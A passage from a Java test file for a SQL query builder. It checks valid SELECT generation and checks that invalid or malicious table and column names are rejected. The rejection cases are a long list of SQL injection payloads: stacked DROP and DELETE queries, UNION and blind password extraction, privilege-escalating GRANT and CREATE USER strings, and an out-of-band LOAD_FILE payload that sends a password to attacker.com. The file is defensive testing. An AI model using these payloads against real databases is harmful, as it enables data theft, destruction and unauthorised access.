                        )
                    )
                ),
                SelectStatement.of(
                    "SELECT * FROM public.user_profile WHERE ((name~~? OR married=?) AND (age>=? AND salary<?)) ;",
                    List.of(
                        StringValue.of("name", "Kimberly"),
                        BooleanValue.of("married", true),
                        IntegerValue.of("age", 25L),
                        DecimalValue.of("salary", new BigDecimal("25505.5"))
                    )
                )
            }
        };
    }

    // Helper method to generate column lists for testing
    private static List<String> generateColumnList(int count) {
        List<String> columns = new ArrayList<>();
        String[] column = {"zero", "one", "two", "three", "four", "five", "six", "seven", "eight", "nine"};
        for (int i = 0; i < count; i += 1) {
            columns.add(column[i % column.length]);
        }
        return columns;
    }

    @Test(dataProvider = "selectDataProvider")
    void testSelectQueryGenerating(SelectQuery selectQuery, SelectStatement selectStatement) {
        var ret = queryBuilder.select(selectQuery);
        Assert.assertTrue(ret.error().isEmpty(), "Error returned " + ret.error().orElse(null) + ", parameters: " + selectQuery);
        Assert.assertEquals(ret.value(), selectStatement);
    }

    @DataProvider(name = "selectInvalidDataProvider")
    public Object[][] selectInvalidDataProvider() {
        return new Object[][] {
            // Table name starting with uppercase
            {
                SelectQuery.wildcard("Table"),
            },

            // Table name starting with number
            {
                SelectQuery.wildcard("1table"),
            },

            // Table name starting with underscore
            {
                SelectQuery.wildcard("_table"),
            },

            // Table name with invalid characters
            {
                SelectQuery.wildcard("table-name"),
            },
            {
                SelectQuery.wildcard("table.name"),
            },
            {
                SelectQuery.wildcard("table name"),
            },
            {
                SelectQuery.wildcard("table@name"),
            },

            // Table name too long (over 101 characters)
            {
                SelectQuery.wildcard("a".repeat(102)),
            },

            // Table name too short (empty)
            {
                SelectQuery.wildcard(""),
            },

            // Invalid column names - should fail validation

            // Column name starting with uppercase
            {
                SelectQuery.of("table", List.of("Column")),
            },

            // Column name starting with number
            {
                SelectQuery.of("table", List.of("1column")),
            },

            // Column name starting with underscore
            {
                SelectQuery.of("table", List.of("_column")),
            },

            // Column name with invalid characters
            {
                SelectQuery.of("table", List.of("column-name")),
            },
            {
                SelectQuery.of("table", List.of("column.name")),
            },
            {
                SelectQuery.of("table", List.of("column name")),
            },
            {
                SelectQuery.of("table", List.of("column@name")),
            },

            // Column name too long (over 101 characters)
            {
                SelectQuery.of("table", List.of("a".repeat(102))),
            },

            // Column name too short (empty)
            {
                SelectQuery.of("table", List.of("")),
            },

            // Multiple invalid columns
            {
                SelectQuery.of("table", List.of("valid_column", "Invalid_Column")),
            },

//            // Too many columns (over 100)
//            {
//                SelectQuery.of("table", generateColumnList(101)),
//            },

            // Null column in list
            {
                SelectQuery.of("table", Arrays.asList("valid_column", null)),
            },

            // SQL Injection attempts in table names
            // Basic SQL injection attempts
            {
                SelectQuery.wildcard("users; DROP TABLE users; --"),
            },
            {
                SelectQuery.wildcard("users' OR '1'='1"),
            },
            {
                SelectQuery.wildcard("users\" OR \"1\"=\"1"),
            },

            // Union-based injection attempts
            {
                SelectQuery.wildcard("users UNION SELECT * FROM passwords"),
            },
            {
                SelectQuery.wildcard("users' UNION SELECT password FROM users --"),
            },

            // Comment-based injection attempts
            {
                SelectQuery.wildcard("users-- comment"),
            },
            {
                SelectQuery.wildcard("users/* comment */"),
            },
            {
                SelectQuery.wildcard("users # comment"),
            },

            // Stacked queries
            {
                SelectQuery.wildcard("users; INSERT INTO logs VALUES ('hacked')"),
            },
            {
                SelectQuery.wildcard("users; UPDATE users SET password='hacked'"),
            },
            {
                SelectQuery.wildcard("users; DELETE FROM users"),
            },

            // Function-based injection attempts
            {
                SelectQuery.wildcard("users WHERE 1=1"),
            },
            {
                SelectQuery.wildcard("users) OR (1=1"),
            },
            {
                SelectQuery.wildcard("users' AND SLEEP(5) --"),
            },

            // SQL Injection attempts in column names

            // Basic injection in column names
            {
                SelectQuery.of("users", List.of("name'; DROP TABLE users; --")),
            },
            {
                SelectQuery.of("users", List.of("name' OR '1'='1")),
            },
            {
                SelectQuery.of("users", List.of("name\" OR \"1\"=\"1")),
            },

            // Union injection in column names
            {
                SelectQuery.of("users", List.of("name UNION SELECT password FROM users")),
            },
            {
                SelectQuery.of("users", List.of("name' UNION SELECT * FROM passwords --")),
            },

            // Comment injection in column names
            {
                SelectQuery.of("users", List.of("name-- comment")),
            },
            {
                SelectQuery.of("users", List.of("name/* comment */")),
            },
            {
                SelectQuery.of("users", List.of("name # comment")),
            },

            // Function calls in column names
            {
                SelectQuery.of("users", List.of("name, password")),
            },
            {
                SelectQuery.of("users", List.of("name FROM users WHERE 1=1 --")),
            },
            {
                SelectQuery.of("users", List.of("name) FROM users WHERE (1=1")),
            },

            // Multiple column injection attempts
            {
                SelectQuery.of("users", List.of("valid_column", "malicious'; DROP TABLE users; --")),
            },
            {
                SelectQuery.of("users", List.of("name' OR '1'='1", "valid_column")),
            },

            // Advanced injection techniques

            // Hex encoding attempts
            {
                SelectQuery.wildcard("users' AND 1=0x31 --"),
            },
            {
                SelectQuery.of("users", List.of("name' AND 1=0x31 --")),
            },

            // Char function attempts
            {
                SelectQuery.wildcard("users' AND 1=CHAR(49) --"),
            },
            {
                SelectQuery.of("users", List.of("name' AND 1=CHAR(49) --")),
            },

            // Time-based blind injection
            {
                SelectQuery.wildcard("users' AND (SELECT COUNT(*) FROM users) > 0 --"),
            },
            {
                SelectQuery.of("users", List.of("name' AND (SELECT COUNT(*) FROM users) > 0 --")),
            },

            // Boolean-based blind injection
            {
                SelectQuery.wildcard("users' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --"),
            },
            {
                SelectQuery.of("users", List.of("name' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --")),
            },

            // Error-based injection
            {
                SelectQuery.wildcard("users' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e)) --"),
            },
            {
                SelectQuery.of("users",
                    List.of("name' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e)) --")),
            },

            // Out-of-band injection
            {
                SelectQuery.wildcard(
                    "users' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share')) --"),
            },

            // Second-order injection patterns
            {
                SelectQuery.wildcard("users' AND 1=(SELECT 1 FROM dual WHERE 1=1) --"),
            },

            // NoSQL injection patterns (even though this is SQL, good to test)
            {
                SelectQuery.wildcard("users' || '1'=='1"),
            },
            {
                SelectQuery.of("users", List.of("name' || '1'=='1")),
            },
            // Escaped quote attempts
            {
                SelectQuery.wildcard("users\\' OR \\'1\\'=\\'1"),
            },
            {
                SelectQuery.of("users", List.of("name\\' OR \\'1\\'=\\'1")),
            },
            // Nested query attempts
            {
                SelectQuery.wildcard("users' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS t) --"),
            },
            {
                SelectQuery.of("users", List.of("name' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS t) --")),
            },
            // Cross-database injection attempts
            {
                SelectQuery.wildcard("users' UNION SELECT * FROM information_schema.tables --"),
            },
            {
                SelectQuery.of("users", List.of("name' UNION SELECT * FROM information_schema.columns --")),
            },
            // Privilege escalation attempts
            {
                SelectQuery.wildcard("users'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' --")
            },
            {
                SelectQuery.of("users", List.of("name'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'password' --"))
            }
        };
    }

    @Test(dataProvider = "selectInvalidDataProvider")
    void testSelectQueryGeneratingSQLInjection(SelectQuery selectQuery) {
        var ret = queryBuilder.select(selectQuery);
        Assert.assertTrue(ret.error().isPresent(),
            "No error. Parameter " + selectQuery + "; columns to return size " + selectQuery.columnKeysToReturn().size());
    }
}
